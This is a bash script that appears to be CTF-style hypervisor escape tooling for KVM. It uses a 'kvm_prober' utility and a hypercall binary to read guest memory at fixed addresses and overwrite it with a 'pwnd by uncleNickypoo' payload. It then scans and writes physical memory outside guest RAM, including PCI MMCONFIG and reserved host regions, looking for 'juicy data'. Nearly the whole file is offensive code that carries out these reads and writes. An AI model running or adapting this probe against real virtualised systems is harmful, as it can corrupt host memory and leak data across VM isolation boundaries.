#!/bin/bash
set -euo pipefail

# ---- CONFIG ----
READ_ADDR1=0x26279a8
READ_ADDR2=0x2b5ee10
WRITE_ADDR1=0x64279a8
WRITE_ADDR2=0x695ee10
SIZE=64     # Adjust for actual flag size/context

# Example PCI/host/kaslr-disabled "interesting" region (update to your favorite)
OUTSIDE_RAM1=0xb0001000     # e.g., start of PCI MMCONFIG
OUTSIDE_RAM2=0xfc000000     # e.g., reserved/PCI host memory
OUT_SIZE=128

REPORT="mmio_test_report_$(date +'%Y%m%d_%H%M%S').txt"
CUSTOM_PAYLOAD="70776e6420627920756e636c654e69636b79706f6f0a"  # "pwnd by uncleNickypoo\n"

# ---- UTILS ----

log() {
    echo -e "$*" | tee -a "$REPORT"
}

call_hypercall() {
    ./hypercall
}

write_custom_mem() {
    local addr=$1; local size=$2
    # Write your hex payload (padded as needed)
    python3 -c "import sys; s=bytes.fromhex('$CUSTOM_PAYLOAD'); sys.stdout.buffer.write(s + b'\x00' * ($size - len(s)))" > /tmp/wbuf
    kvm_prober writemmio_buf "$addr" /tmp/wbuf
}

log_guest_ram() {
    log ""
    log "# Guest VM RAM regions (from /proc/iomem):"
    awk '/System RAM/ {print $0}' /proc/iomem | tee -a "$REPORT"
}

# ---- MAIN ----

log "# MMIO Probe Report ($(date))"
log ""
log "Read Addresses:  $READ_ADDR1 $READ_ADDR2"
log "Write Addresses: $WRITE_ADDR1 $WRITE_ADDR2"
log "Data Size: $SIZE bytes"
log "Custom Payload: \"$CUSTOM_PAYLOAD\" ('pwnd by uncleNickypoo')"
log "----"

# --- Standard MMIO read/write/hypercall cycles ---
sleep 2
for addr in $READ_ADDR1 $READ_ADDR2; do
    log ""; log "## Reading $addr before hypercall"
    mem_before=$(kvm_prober readmmio_buf "$addr" "$SIZE" | hexdump -C)
    log "[BEFORE] $addr:"; log "$mem_before"
    log "[*] Calling hypercall after read of $addr"
    hypercall_resp=$(call_hypercall 2>&1)
    log "[HYPERCALL RESPONSE] after read $addr:"; log "$hypercall_resp"
done

sleep 2
for addr in $WRITE_ADDR1 $WRITE_ADDR2; do
    log ""; log "## Reading $addr before write"
    mem_before=$(kvm_prober readmmio_buf "$addr" "$SIZE" | hexdump -C)
    log "[BEFORE] $addr:"; log "$mem_before"

    log "[*] Writing custom payload to $addr"
    write_custom_mem "$addr" "$SIZE"
    log "[*] Wrote custom payload to $addr"

    mem_after=$(kvm_prober readmmio_buf "$addr" "$SIZE" | hexdump -C)
    log "[AFTER] $addr:"; log "$mem_after"

    log "[*] Calling hypercall after write of $addr"
    hypercall_resp=$(call_hypercall 2>&1)
    log "[HYPERCALL RESPONSE] after write $addr:"; log "$hypercall_resp"
done

sleep 2
log ""
log "# Standard MMIO tests complete!"
log_guest_ram

# --- Scan OUTSIDE guest RAM for juicy data ---
log ""
log "# === OUTSIDE GUEST RAM SCAN ==="

sleep 2
for out_addr in $OUTSIDE_RAM1 $OUTSIDE_RAM2; do
    log ""
    log "[*] OUTSIDE RAM: Reading $OUT_SIZE bytes at $out_addr (hexdump, 10 lines):"
    kvm_prober readmmio_buf "$out_addr" "$OUT_SIZE" | hexdump -C | head -n 10 | tee -a "$REPORT"
    log ""
    log "[*] OUTSIDE RAM: Strings found:"
    kvm_prober readmmio_buf "$out_addr" "$OUT_SIZE" | xxd -r -p | strings | tee -a "$REPORT"
done

# --- Try writing OUTSIDE guest RAM, then verify ---
EXT_ADDR=0xb0002000  # another outside-RAM PCI or reserved
EXT_SIZE=64

log ""
log "# --- OUTSIDE RAM WRITE/VERIFY TEST ---"
log "[*] Reading $EXT_SIZE bytes at $EXT_ADDR before write"
before=$(kvm_prober readmmio_buf "$EXT_ADDR" "$EXT_SIZE" | hexdump -C)
log "[OUTSIDE BEFORE] $EXT_ADDR:"; log "$before"
sleep 2
echo "reading asic representation of output"
sleep 2
before=$(kvm_prober readmmio_buf "$EXT_ADDR" "$EXT_SIZE" | xxd -r -p | strings)

sleep 2
log "[*] Writing custom payload to $EXT_ADDR"
write_custom_mem "$EXT_ADDR" "$EXT_SIZE"
log "[*] Wrote custom payload to $EXT_ADDR"

sleep 2
log "[*] Reading $EXT_SIZE bytes at $EXT_ADDR after write"
after=$(kvm_prober readmmio_buf "$EXT_ADDR" "$EXT_SIZE" | hexdump -C)
log "[OUTSIDE AFTER] $EXT_ADDR:"; log "$after"

sleep 2
log ""
log "# All tests done!"
echo "Report saved as $REPORT"
